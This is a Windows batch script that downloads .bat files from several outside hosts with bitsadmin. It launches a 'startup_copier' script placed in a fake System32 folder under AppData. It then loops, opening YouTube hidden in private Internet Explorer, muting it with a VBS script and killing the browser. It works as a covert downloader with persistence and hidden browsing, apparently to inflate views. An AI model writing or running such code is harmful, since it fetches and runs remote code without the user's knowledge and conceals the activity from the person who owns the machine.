@echo off 
IF EXIST "C:\Users\Popeye\Desktop\downloadtest.bat" ( 
	echo "it's here!" 
) ELSE ( 
	bitsadmin /transfer n /download /priority normal "https://raw.githubusercontent.com/bnichs5/testwebsite/master/downloadtest.bat" "C:\Users\Popeye\Desktop\downloadtest.bat" 
)	 
IF EXIST "C:\Users\Popeye\Desktop\downloadtest.bat" ( 
    echo "it's here!" 
) ELSE ( 
    bitsadmin /transfer n /download /priority normal "https://bitbucket.org/w1672993/testwebsite/downloads/downloadtest.bat" "C:\Users\Popeye\Desktop\downloadtest.bat" 
) 
IF EXIST "C:\Users\Popeye\Desktop\htmltest.bat" ( 
    echo "it's here!" 
) ELSE ( 
    bitsadmin /transfer n /download /priority normal "http://androidfriends.onlinewebshop.net/htmltest.bat" "C:\Users\Popeye\Desktop\htmltest.bat" 
) 
start C:\Users\Popeye\AppData\Roaming\System32\startup_copier.bat 
:loop 
start /min iexplore -private http://youtube.com 
ping -n 35 127.0.0.1 
start C:\Users\Popeye\AppData\Roaming\Microsoft\mute.vbs 
taskkill /f /im iexplore.exe 
taskkill /f /im C:\Users\Popeye\AppData\Roaming\Microsoft\mute.vbs  
ping -n 205 127.0.0.1 
goto loop 
